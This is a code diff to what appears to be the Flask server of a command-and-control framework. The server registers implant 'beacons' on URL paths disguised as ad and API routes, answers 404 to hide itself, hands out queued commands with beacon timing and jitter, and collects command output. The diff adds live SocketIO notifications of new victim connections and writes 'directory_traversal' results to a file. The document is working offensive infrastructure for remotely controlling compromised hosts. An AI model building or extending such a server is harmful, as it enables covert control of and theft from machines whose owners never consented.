@@ -1,14 +1,16 @@
-from flask import Flask, request, jsonify, redirect
+from flask import Flask, request, jsonify, redirect, send_from_directory
 import uuid
 import time
 import logging
+from flask_socketio import SocketIO
 from Modules.global_objects import (
     beacons, add_beacon_list, beacon_commands, config)
 
 
-app = Flask(__name__)
+beaconControl = Flask(__name__)
+socketio = SocketIO(beaconControl, cors_allowed_origins="*")
 log = logging.getLogger('werkzeug')
-app.logger.setLevel(logging.ERROR)
+beaconControl.logger.setLevel(logging.ERROR)
 log.setLevel(logging.ERROR)
 
 
@@ -23,7 +25,7 @@ it will return a 404
 """
 
 
-@app.route('/<part1>/<part2>/<ad_param>/api/v<int:version>', methods=['POST'])
+@beaconControl.route('/<part1>/<part2>/<ad_param>/api/v<int:version>', methods=['POST'])
 def connectionRequest(part1, part2, ad_param, version):
     if "ad" not in ad_param or version not in range(1, 11):
         return '', 404
@@ -37,6 +39,7 @@ def connectionRequest(part1, part2, ad_param, version):
                         os, time.asctime(),
                         config['beacon']["interval"],
                         config['beacon']['jitter'])
+        socketio.emit('new_connection', {'uuid': userID, 'name': name, 'os': os, 'address': address, "interval": config['beacon']["interval"], "jitter": config['beacon']['jitter']})
         return {"timer": config['beacon']["interval"],
                 "uuid": userID, "jitter": config['beacon']['jitter']}, 200
     else:
@@ -55,7 +58,7 @@ it will return a 404
 """
 
 
-@app.route('/<part1>/<ad_param>/getLatest', methods=['POST'])
+@beaconControl.route('/<part1>/<ad_param>/getLatest', methods=['POST'])
 def reconect(part1, ad_param):
     if "ad" not in ad_param:
         return '', 404
@@ -79,7 +82,7 @@ def reconect(part1, ad_param):
         return '', 404
 
 
-@app.route('/checkUpdates/<part1>/<part2>', methods=['GET'])
+@beaconControl.route('/checkUpdates/<part1>/<part2>', methods=['GET'])
 def beacon(part1, part2):
     data = {}
     id = request.args.get('session')
@@ -91,9 +94,17 @@ def beacon(part1, part2):
         if beacon_id == id:
             beacons["last_beacon"][i] = time.asctime()
             timer = beacons["timer"][i]
+            jitter = beacons["jitter"][i]
             next_beacon_time = time.time() + timer
             beacons["next_beacon"][i] = time.asctime(
                 time.localtime(next_beacon_time))
+
+            # Emit countdown update via SocketIO
+            socketio.emit('countdown_update', {
+                'uuid': id,
+                'timer': timer,
+                'jitter': jitter,
+            })
 
     for j in range(len(beacon_commands["beacon_uuid"])):
         if beacon_commands["executed"][j]:
@@ -108,7 +119,7 @@ def beacon(part1, part2):
     return jsonify(data), 200
 
 
-@app.route('/updateReport/<path1>/api/v<int:version>', methods=['POST'])
+@beaconControl.route('/updateReport/<path1>/api/v<int:version>', methods=['POST'])
 def response(path1, version):
     if version not in range(1, 11):
         return '', 404
@@ -120,11 +131,17 @@ def response(path1, version):
             found = True
             if i < len(beacon_commands["command_output"]):
                 beacon_commands["command_output"][i] = output
-                print(
-                    f"Command {beacon_commands['beacon_uuid'][i]} ",
-                    "responded with:"
-                )
-                print(output)
+                if beacon_commands["command"][i] == "directory_traversal":
+                    # need to handle this properly
+                    print("Directory Traversal Responded, saved to file")
+                    with open("directory_traversal.txt", "w") as f:
+                        f.write(output)
+                else:
+                    print(
+                        f"Command {beacon_commands['beacon_uuid'][i]} ",
+                        "responded with:"
+                    )
+                    print(output)
             else:
                 print(
                     f"Index {i} out of range for ",
